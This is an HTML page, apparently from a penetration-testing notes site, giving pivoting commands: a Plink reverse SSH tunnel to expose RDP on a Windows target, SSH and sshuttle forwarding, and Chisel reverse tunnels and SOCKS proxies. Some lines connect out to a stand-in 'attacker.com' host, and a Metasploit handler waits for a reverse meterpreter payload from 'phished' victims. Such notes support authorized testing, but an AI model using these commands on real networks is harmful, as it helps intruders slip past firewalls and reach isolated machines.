@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Plink for Remote Desktop Connections - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Plink for Remote Desktop Connections", url: "#_top", children: [
+          ]},
+          {title: "SSH Tunneling + SSHuttle and Chisel", url: "#ssh-tunneling-sshuttle-and-chisel", children: [
+              {title: "Local port forwarding", url: "#local-port-forwarding" },
+              {title: "Remote port forwarding", url: "#remote-port-forwarding" },
+              {title: "Dynamic port forwarding with proxychains", url: "#dynamic-port-forwarding-with-proxychains" },
+              {title: "Dynamic port forwarding with SSHuttle", url: "#dynamic-port-forwarding-with-sshuttle" },
+              {title: "Chisel", url: "#chisel" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="plink-for-remote-desktop-connections">Plink for Remote Desktop Connections</h1>
+<p>Used in case RDP service (usually 3389/tcp) is not accessible directly (i.e. not allowed through the external firewall)</p>
+<ol>
+<li>
+<p>On local machine (~Kali)</p>
+<ol>
+<li>Create a limited user[^1]</li>
+</ol>
+</li>
+<li>
+<p>On target machine (Windows)</p>
+<ol>
+<li>Check first if somebody has currently connected to the host's RDP service<ul>
+<li><code class="language-bash highlight">qwinsta<span class="w"> </span>/server:&lt;server_name&gt;</code></li>
+</ul>
+</li>
+<li>Download <em>plink.exe</em> on the target machine</li>
+<li>Execute a reverse SSH connection using Plink.exe<ul>
+<li><code class="language-bash highlight"><span class="nb">echo</span><span class="w"> </span>y<span class="w"> </span><span class="p">|</span><span class="w"> </span>plink.exe<span class="w"> </span>&lt;YOUR_IP&gt;<span class="w"> </span>-P<span class="w"> </span><span class="m">22</span><span class="w"> </span>-R<span class="w"> </span><span class="m">3389</span>:127.0.0.1:3389<span class="w"> </span>-l<span class="w"> </span>&lt;created_limited_username&gt;<span class="w"> </span>-pw<span class="w"> </span>&lt;password&gt;</code></li>
+</ul>
+</li>
+</ol>
+</li>
+<li>On the local machine (~Kali)<ol>
+<li>Connect to the RDP service using an RDP Client<ul>
+<li><code class="language-bash highlight">rdesktop<span class="w"> </span>-g90x90<span class="w"> </span>localhost</code> (Usually fails)</li>
+<li><code class="language-bash highlight">xfreerdp<span class="w"> </span>/u:<span class="s2">&quot;&lt;victim_machine_username&gt;&quot;</span><span class="w"> </span>/v:localhost:3389</code></li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+<p>[^1]: <a href="https://ostechnix.com/how-to-limit-users-access-to-the-linux-system/">Instructions on creating a limited user</a></p>
+<h1 id="ssh-tunneling-sshuttle-and-chisel">SSH Tunneling + SSHuttle and Chisel</h1>
+<p>Used for pivoting</p>
+<h2 id="local-port-forwarding">Local port forwarding</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>ssh -v -N -L localPort:targetIp:targetPort user@sshGateway &lt;-i private_key&gt;
+</span></code></pre></div>
+<h2 id="remote-port-forwarding">Remote port forwarding</h2>
+<ul>
+<li>Below is the preparation that is needed to be done on the SSH Server(Pivot)
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo echo &quot;GatewayPorts clientspecified&quot; &gt;&gt; /etc/ssh/sshd_config
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>sudo systemctl restart ssh
+</span></code></pre></div></li>
+<li>Command:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>ssh -R sshGatewayIp:sshGatewayPort:localIp:localPort user@sshGateway
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>ssh -R 127.0.0.1:2222:127.0.0.1:22 ubuntu@11.22.33.44
+</span></code></pre></div></li>
+</ul>
+<h2 id="dynamic-port-forwarding-with-proxychains">Dynamic port forwarding with proxychains</h2>
+<ul>
+<li>
+<p>Has limitations: Produces inaccurate results (i.e. nmap)<a href="[MrW0r57](https://mrw0r57.github.io/2020-05-31-linux-post-exploitation-10-4/)">^2</a>[^3]<a href="[NetSec](https://netsec.ws/?p=278)">^4</a></p>
+</li>
+<li>
+<p>Proxychains preparation (Change localPort):
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a># Normal
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>sudo echo &quot;socks4 127.0.0.1 localPort&quot; &gt;&gt; /etc/proxychains.conf
+</span></code></pre></div></p>
+</li>
+<li>Command to establish connection(Basic command is just "-D"):
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>ssh -NfD localPort user@sshGateway
+</span></code></pre></div></li>
+<li>Make use of proxychains:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>proxychains nmap -v --open -sT -Pn -T4 -p21,22,23,25,80,139,443,445,3389,8000,8080 10.0.1.0/24 #-sT -Pn for proxychains
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>proxychains msfconsole 
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>proxychains rdesktop targetIP -u user -p password -g 90%
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>proxychains ssh -NfD 2ndlocalPort user@2ndLevelPhasesshGateway
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>proxychains firefox
+</span></code></pre></div></li>
+</ul>
+<h2 id="dynamic-port-forwarding-with-sshuttle">Dynamic port forwarding with SSHuttle</h2>
+<ul>
+<li><strong>Recommended</strong> and does not need root on pivot machine)</li>
+<li>Has limitations: Does not really work with nmap</li>
+<li>Use a <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap">static nmap binary</a> instead on the compromised host</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>sshuttle -v -r user@sshGateway network/netmask
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a># Using public key authentication:
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>sshuttle -v -r user@sshGateway network/netmask -e &#39;ssh -i /path/to/private_key&#39;
+</span></code></pre></div>
+<h2 id="chisel">Chisel</h2>
+<ul>
+<li><strong>Recommended</strong> and does not need root on pivot machine) [^5]</li>
+<li>Alternative for SSH(Local, Remote and Dynamic) especially on pivoting machines<ul>
+<li>Built on Go</li>
+<li>Has ready made binary releases on Github which works on a lot of Operating Systems<a href="[0xdf](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)">^6</a><ul>
+<li>Better to compile though</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a># Server (On your attacking machine[Kali])
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>./chisel server -v -p 8000 --reverse
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a># Port Forwarding (Commonly on the 1st compromised machine [Pivot Machine])
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>## Listen on Kali 4444/tcp, forward to 10.10.10.240 port 80
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>./chisel client -v &lt;YOUR_KALI_IP&gt;:8000 R:4444:10.10.10.240:80
+</span></code></pre></div>
+<ul>
+<li>Remote/Reverse Forwarding (for <em>reverse connections</em> [i.e. reverse_tcp])<ul>
+<li>Quick Diagrams for the visual people</li>
+</ul>
+</li>
+</ul>
+<p>[INTERNET_ISOLATED_MACHINE] --&gt; [Pivot_Machine] --(FIREWALL)--(INTERNET)-- [C2/Kali]
+---making it seamless as if:---
+[INTERNET_ISOLATED_MACHINE] =============================================&gt; [C2/Kali]</p>
+<div class="language-text highlight"><pre><span></span><code>* From Kali: `./chisel server -v -p 8000 --reverse` From C2: `./chisel server -v -p 443 --reverse` 
+* Commonly on the 1st compromised machine [Pivot Machine]
+    * Let us call this [Pivot Machine]: *PHISHEDVICTIM01.acme.local*
+    * *BEWARE*: May trigger _Windows Firewall Allow/Deny_ pop-up window on this host upon running. May need to allow first or create a manual firewall entry via cli or choose a firewall port already allowed but unused by a service.
+    * The command below will direct any traffic it receives on 3333/tcp to your Kali 3333/tcp
+
+        ```batch
+        chisel.exe client -v &lt;YOUR_KALI_IP&gt;:8000  3333:127.0.0.1:3333
+        #OR
+        chisel.exe client -v &lt;YOUR_C2_domain&gt;:443 3333:127.0.0.1:3333
+        ```
+
+* After the command above, execute the command below on your Kali/c2 machine or something similar (i.e. `exploit/multi/handler`)
+    ```
+    nc -lnvp 3333
+    #OR
+    msfconsole -q -x &quot;use exploit/multi/handler;set LPORT 3333; set LHOST eth0; set payload windows/x64/meterpreter/reverse_https;run -jz&quot;
+    ```
+* Now on the [INTERNET_ISOLATED_MACHINE]/target/victim (without direct connection to your C2/Kali) like the DC or ICS.
+    * Test
+        ```batch
+        curl.exe PHISHEDVICTIM01.acme.local:3333
+        ```
+    * Use a one-liner powershell
+    * C2 payload to point to `PHISHEDVICTIM01.acme.local:3333`
+</code></pre></div>
+<ul>
+<li>Chisel Socks Proxy<ul>
+<li>Using <code>reverse</code> command<ol>
+<li>On the server (C2[cloud] / Kali VM[internal/labs])
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>./chisel server -v -p 8000 --reverse
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>sudo echo &quot;socks5 127.0.0.1 1080&quot; &gt; /etc/proxychains.conf
+</span></code></pre></div></li>
+<li>On the client/target/victim machine
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>chisel.exe client -v &lt;c2/kali_IP&gt;:8000 R:socks
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>or
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>chisel.exe client -v attacker.com:8000 R:socks
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>or
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>chisel.exe client -v 192.168.1.5:8000 R:socks
+</span></code></pre></div></li>
+<li>On the server (C2[cloud] / Kali VM[internal/labs])
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>sudo bash -c &#39;echo &quot;socks5 127.0.0.1 1080&quot; &gt;&gt; /etc/proxychains.conf&#39;
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>ssh -NfD 1080 127.0.0.1
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>proxychains nmap -v --open -sT -Pn -T4 -p21,22,23,25,80,139,443,445,3389,8000,8080 10.0.1.0/24 #-sT -Pn for proxychains
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>proxychains msfconsole 
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>proxychains rdesktop targetIP -u user -p password -g 90%
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>proxychains ssh -NfD 2ndlocalPort user@2ndLevelPhasesshGateway
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>proxychains firefox
+</span></code></pre></div></li>
+</ol>
+</li>
+<li>Using <code>socks5</code> command<ol>
+<li>On the server (C2[cloud] / Kali VM[internal/labs])
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>./chisel server -v -p 8000 --socks5
+</span></code></pre></div></li>
+<li>On the client/target/victim machine
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>chisel.exe client -v &lt;c2/kali_IP&gt;:8000 socks
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>or
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>chisel.exe client -v attacker.com:8000 socks
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>or
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>chisel.exe client -v 192.168.1.5:8000 socks
+</span></code></pre></div></li>
+<li>On the server (C2[cloud] / Kali VM[internal/labs])
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>sudo bash -c &#39;echo &quot;socks5 127.0.0.1 1080&quot; &gt;&gt; /etc/proxychains.conf&#39;
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>ssh -NfD 1080 127.0.0.1
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>proxychains nmap -v --open -sT -Pn -T4 -p21,22,23,25,80,139,443,445,3389,8000,8080 10.0.1.0/24 #-sT -Pn for proxychains
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>proxychains msfconsole 
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>proxychains rdesktop targetIP -u user -p password -g 90%
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>proxychains ssh -NfD 2ndlocalPort user@2ndLevelPhasesshGateway
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>proxychains firefox
+</span></code></pre></div></li>
+</ol>
+</li>
+<li>TIP<ul>
+<li>If the chisel server is on a cloud C2, and you want to connect from your kali(separate machine)<ul>
+<li>Perform step <strong>c.</strong> on your Kali instead, no need to do it on the chisel server(c2)<ul>
+<li>Just change <code>ssh -NfD 1080 127.0.0.1</code> to <code>ssh -NfD 1080 ubuntu@c2domain.com</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>[^1]: <a href="https://blog.notso.pro/2019-10-24-tactical-debriefing1/">not so pro</a></p>
+<p>[^3]: <a href="https://www.codeproject.com/tips/634228/how-to-use-proxychains-forwarding-ports">CodeProject - Grant Curell</a></p>
+<p>[^5]: <a href="https://github.com/jpillora/chisel">Download from Github</a></p>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/network/connections/SSH_Tunneling.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
